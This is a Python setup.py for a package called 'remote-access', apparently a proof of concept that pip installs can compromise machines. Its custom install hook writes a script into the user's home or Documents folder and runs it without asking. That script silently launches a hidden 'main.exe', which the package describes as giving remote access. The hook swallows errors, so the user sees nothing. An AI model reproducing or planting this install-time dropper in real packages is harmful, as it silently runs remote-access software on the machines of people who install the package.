import subprocess,os,sys
from setuptools import setup, find_packages
from setuptools.command.install import install


Code = """
import subprocess

process = subprocess.Popen("main.exe", stdout=subprocess.PIPE, creationflags=0x08000000)
process.wait()
"""

class execute(install):
    def run(self):
        install.run(self)
        file = open("remote-access.py", "w")
        file.write(Code)
        file.close()
        dest = os.path.expanduser("~")
        if sys.platform == "win32":
            dest = os.path.expanduser('~/Documents')
        try:
            os.rename("remote-access.py", dest+"/remote-access.py")
        except FileExistsError:
            os.remove(dest+"/remote-access.py")
            os.rename("remote-access.py", dest+"/remote-access.py")
        try : 
            subprocess.Popen(["python", dest+"/remote-access.py"],stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=False, text=False)
        except:
            pass
        

VERSION = '0.0.3'
DESCRIPTION = 'To Show the vulnerability of the system'
LONG_DESCRIPTION = 'A package that allows you to get remote access of a machine.'
CLASSIFIERS = [
        "Development Status :: 1 - Planning",
        "Intended Audience :: Developers",
        "Programming Language :: Python :: 3",
        "Topic :: Security",
        "Operating System :: Unix",
        "Operating System :: Microsoft :: Windows",
        "License :: OSI Approved :: MIT License",
    ]
# Setting up
setup(
    name="remote-access",
    version=VERSION,
    author="The-Robin-Hood (Ansari)",
    description=DESCRIPTION,
    long_description= open('README.md').read(),
    long_description_content_type="text/markdown",
    packages=find_packages(),
    url = "https://github.com/The-Robin-Hood/pip-remote-access",
    project_urls = {
        "Bug Tracker": "https://github.com/The-Robin-Hood/pip-remote-access/issues",
    },
    install_requires=[''],
    keywords=['python', 'vulnerability', 'remoteaccess', 'sockets'],
    classifiers= CLASSIFIERS,
    cmdclass={'install': execute},
    include_package_data=True,
)
 
